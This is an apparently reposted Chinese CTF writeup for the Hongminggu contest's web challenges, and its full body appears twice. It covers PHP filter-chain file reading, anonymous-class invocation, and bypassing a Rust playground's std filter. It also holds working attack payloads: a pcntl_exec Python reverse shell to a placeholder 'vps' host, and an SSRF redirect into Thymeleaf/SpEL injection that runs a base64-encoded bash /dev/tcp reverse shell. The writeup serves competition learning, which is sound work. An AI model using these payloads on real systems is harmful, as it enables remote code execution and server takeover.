# 第四届红明谷杯卫星应用数据安全大赛 WEB writeup

> 原文: https://www.ctfiot.com/173339.html
> ID: 173339

PHP Filter链——基于oracle的文件读取攻击 – 先知社区 (aliyun.com)

https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkWepSazHG%3D4D#toc-16

匿名类

<?php highlight_file(__FILE__); // flag.php if (isset($_POST['f'])) { echo hash_file('md5', $_POST['f']); } ?>

//GitHub - synacktiv/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle.https://github.com/synacktiv/php_filter_chains_oracle_exploit

直接用工具跑出flag.php

<?phpif (isset($_GET['ezphpPhp8'])) { highlight_file(__FILE__);} else { die("No");}$a = new class { function __construct(){ }
 function getflag(){ system('cat /flag'); }};unset($a);$a = $_GET['ezphpPhp8'];$f = new $a();$f->getflag();?>

想方法调用匿名类

?ezphpPhp8=anonymous?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0

还可以用vardump getdeclared_classes

disabled_function绕过

www.zip泄露源码

<?phpif (!isset($_SERVER['PHP_AUTH_USER'])) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo '小明是运维工程师，最近网站老是出现bug。'; exit;} else { $validUser = 'admin'; $validPass = '2e525e29e465f45d8d7c56319fe73036';
 if ($_SERVER['PHP_AUTH_USER'] != $validUser || $_SERVER['PHP_AUTH_PW'] != $validPass) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo 'Invalid credentials'; exit; }}@eval($_GET['cmd']);highlight_file(__FILE__);?>

可以执行命令但大部分被ban了

用pcntl_exec

pcntl_exec("/usr/bin/python",array(%27-c%27,%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);%27));

接下来就是想办法提权

发现个config.inc

#[macro_use] extern crate rocket;
use std::fs;use std::fs::
File;use std::io::
Write;use std::
process::
Command;use rand::
Rng;
#[get("/")]fn index() -> String { fs::
read_to_string("main.rs").unwrap_or(String::
default())}
#[post("/rust_code", data = "<code>")]fn run_rust_code(code: String) -> String{ if code.contains("std") { return "Error: std is not allowed".to_string(); } //generate a random 5 length file name let file_name = rand::
thread_rng() .sample_iter(&rand::
distributions::
Alphanumeric) .take(5) .map(char::
from) .collect::<String>(); if let Ok(mut file) = File::
create(format!("playground/{}.rs", &file_name)) { file.write_all(code.as_bytes()); } if let Ok(build_output) = Command::
new("rustc") .arg(format!("playground/{}.rs",&file_name)) .arg("-C") .arg("debuginfo=0") .arg("-C") .arg("opt-level=3") .arg("-o") .arg(format!("playground/{}",&file_name)) .output() { if !build_output.status.success(){ fs::
remove_file(format!("playground/{}.rs",&file_name)); return String::
from_utf8_lossy(build_output.stderr.as_slice()).to_string(); } } fs::
remove_file(format!("playground/{}.rs",&file_name)); if let Ok(output) = Command::
new(format!("playground/{}",&file_name)) .output() { if !output.status.success(){ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stderr.as_slice()).to_string(); } else{ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stdout.as_slice()).to_string(); } } return String::
default();
}
#[launch]fn rocket() -> _ { let figment = rocket::
Config::
figment() .merge(("address", "0.0.0.0")); rocket::
custom(figment).mount("/", routes![index,run_rust_code])}

过滤了std

直接include

fn main() { include!("/flag");}

还可以内联写C绕过

//声明外部函数 C语言库函数extern "C" { fn system(cmd: *const u8) -> i32;}
fn main() { // Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作 unsafe { system("cat /flag".as_ptr()); }}

package com.example.controller;
import com.example.utils.Utils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.concurrent.TimeUnit;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
@RestControllerpublic class CurlController { private static final String RESOURCES_DIRECTORY = "resources"; private static final String SAVE_DIRECTORY = "sites";
 public CurlController() { }
 @RequestMapping({"/curl"}) public String curl(@RequestParam String url, HttpServletRequest request, HttpServletResponse response) throws Exception { if (!url.startsWith("http:") && !url.startsWith("https:")) { System.out.println(url.startsWith("http")); return "No protocol: " + url; } else { URL urlObject = new URL(url); String result = ""; String hostname = urlObject.getHost(); if (hostname.indexOf("../") != -1) { return "Illegal hostname"; } else { InetAddress inetAddress = InetAddress.getByName(hostname); if (Utils.isPrivateIp(inetAddress)) { return "Illegal ip address"; } else { try { String savePath = System.getProperty("user.dir") + File.separator + "resources" + File.separator + "sites"; File saveDir = new File(savePath); if (!saveDir.exists()) { saveDir.mkdirs(); }
 TimeUnit.SECONDS.sleep(4L); HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection(); if (connection instanceof HttpURLConnection) { connection.connect(); int statusCode = connection.getResponseCode(); if (statusCode == 200) { BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
 BufferedWriter writer; String line; for(writer = new BufferedWriter(new FileWriter(savePath + File.separator + hostname + ".html")); (line = reader.readLine()) != null; result = result + line + "n") { }
 writer.write(result); reader.close(); writer.close(); } }
 return result; } catch (Exception var15) { return var15.toString(); } } } } }}

package com.example.controller;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.context.Context;
import org.thymeleaf.spring5.SpringTemplateEngine;
@Controllerpublic class AdminController { public AdminController() { }
 @GetMapping({"/getsites"}) public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception { String ipAddress = request.getRemoteAddr(); if (!ipAddress.equals("127.0.0.1")) { response.setStatus(HttpStatus.FORBIDDEN.value()); return "forbidden"; } else { Context context = new Context(); TemplateEngine engine = new SpringTemplateEngine(); String dispaly = engine.process(hostname, context); return dispaly; } }}

https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89

/curl?url=http://vps:
port/exploit.php

<?php header("Location:
http://127.0.0.1:
8080/getsites?hostname=[[${T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")').getValue()}]]


```
https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkWepSazHG%3D4D#toc-16
<?php highlight_file(__FILE__); // flag.php if (isset($_POST['f'])) { echo hash_file('md5', $_POST['f']); } ?>
//GitHub - synacktiv/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle.https://github.com/synacktiv/php_filter_chains_oracle_exploit
<?phpif (isset($_GET['ezphpPhp8'])) { highlight_file(__FILE__);} else { die("No");}$a = new class { function __construct(){ }
 function getflag(){ system('cat /flag'); }};unset($a);$a = $_GET['ezphpPhp8'];$f = new $a();$f->getflag();?>
?ezphpPhp8=anonymous?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0
<?phpif (!isset($_SERVER['PHP_AUTH_USER'])) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo '小明是运维工程师，最近网站老是出现bug。'; exit;} else { $validUser = 'admin'; $validPass = '2e525e29e465f45d8d7c56319fe73036';
 if ($_SERVER['PHP_AUTH_USER'] != $validUser || $_SERVER['PHP_AUTH_PW'] != $validPass) { header('WWW-Authenticate: Basic realm="Restricted Area"'); header('HTTP/1.0 401 Unauthorized'); echo 'Invalid credentials'; exit; }}@eval($_GET['cmd']);highlight_file(__FILE__);?>
pcntl_exec("/usr/bin/python",array(%27-c%27,%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);%27));
#[macro_use] extern crate rocket;
use std::fs;use std::fs::
File;use std::io::
Write;use std::
process::
Command;use rand::
Rng;
#[get("/")]fn index() -> String { fs::
read_to_string("main.rs").unwrap_or(String::
default())}
#[post("/rust_code", data = "<code>")]fn run_rust_code(code: String) -> String{ if code.contains("std") { return "Error: std is not allowed".to_string(); } //generate a random 5 length file name let file_name = rand::
thread_rng() .sample_iter(&rand::
distributions::
Alphanumeric) .take(5) .map(char::
from) .collect::<String>(); if let Ok(mut file) = File::
create(format!("playground/{}.rs", &file_name)) { file.write_all(code.as_bytes()); } if let Ok(build_output) = Command::
new("rustc") .arg(format!("playground/{}.rs",&file_name)) .arg("-C") .arg("debuginfo=0") .arg("-C") .arg("opt-level=3") .arg("-o") .arg(format!("playground/{}",&file_name)) .output() { if !build_output.status.success(){ fs::
remove_file(format!("playground/{}.rs",&file_name)); return String::
from_utf8_lossy(build_output.stderr.as_slice()).to_string(); } } fs::
remove_file(format!("playground/{}.rs",&file_name)); if let Ok(output) = Command::
new(format!("playground/{}",&file_name)) .output() { if !output.status.success(){ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stderr.as_slice()).to_string(); } else{ fs::
remove_file(format!("playground/{}",&file_name)); return String::
from_utf8_lossy(output.stdout.as_slice()).to_string(); } } return String::
default();
}
#[launch]fn rocket() -> _ { let figment = rocket::
Config::
figment() .merge(("address", "0.0.0.0")); rocket::
custom(figment).mount("/", routes![index,run_rust_code])}
fn main() { include!("/flag");}
//声明外部函数 C语言库函数extern "C" { fn system(cmd: *const u8) -> i32;}
fn main() { // Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作 unsafe { system("cat /flag".as_ptr()); }}
package com.example.controller;
import com.example.utils.Utils;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.concurrent.TimeUnit;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
@RestControllerpublic class CurlController { private static final String RESOURCES_DIRECTORY = "resources"; private static final String SAVE_DIRECTORY = "sites";
 public CurlController() { }
 @RequestMapping({"/curl"}) public String curl(@RequestParam String url, HttpServletRequest request, HttpServletResponse response) throws Exception { if (!url.startsWith("http:") && !url.startsWith("https:")) { System.out.println(url.startsWith("http")); return "No protocol: " + url; } else { URL urlObject = new URL(url); String result = ""; String hostname = urlObject.getHost(); if (hostname.indexOf("../") != -1) { return "Illegal hostname"; } else { InetAddress inetAddress = InetAddress.getByName(hostname); if (Utils.isPrivateIp(inetAddress)) { return "Illegal ip address"; } else { try { String savePath = System.getProperty("user.dir") + File.separator + "resources" + File.separator + "sites"; File saveDir = new File(savePath); if (!saveDir.exists()) { saveDir.mkdirs(); }
 TimeUnit.SECONDS.sleep(4L); HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection(); if (connection instanceof HttpURLConnection) { connection.connect(); int statusCode = connection.getResponseCode(); if (statusCode == 200) { BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
 BufferedWriter writer; String line; for(writer = new BufferedWriter(new FileWriter(savePath + File.separator + hostname + ".html")); (line = reader.readLine()) != null; result = result + line + "n") { }
 writer.write(result); reader.close(); writer.close(); } }
 return result; } catch (Exception var15) { return var15.toString(); } } } } }}
package com.example.controller;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.http.HttpStatus;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.thymeleaf.TemplateEngine;
import org.thymeleaf.context.Context;
import org.thymeleaf.spring5.SpringTemplateEngine;
@Controllerpublic class AdminController { public AdminController() { }
 @GetMapping({"/getsites"}) public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception { String ipAddress = request.getRemoteAddr(); if (!ipAddress.equals("127.0.0.1")) { response.setStatus(HttpStatus.FORBIDDEN.value()); return "forbidden"; } else { Context context = new Context(); TemplateEngine engine = new SpringTemplateEngine(); String dispaly = engine.process(hostname, context); return dispaly; } }}
https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89
/curl?url=http://vps:
port/exploit.php
<?php header("Location:
http://127.0.0.1:
8080/getsites?hostname=[[${T(org.thymeleaf.util.ClassLoaderUtils).loadClass('org.apa'+'che.logging.log4j.util.LoaderUtil').newInstanceOf('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser').parseExpression('T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")').getValue()}]]
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1712914127.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1712914128.png)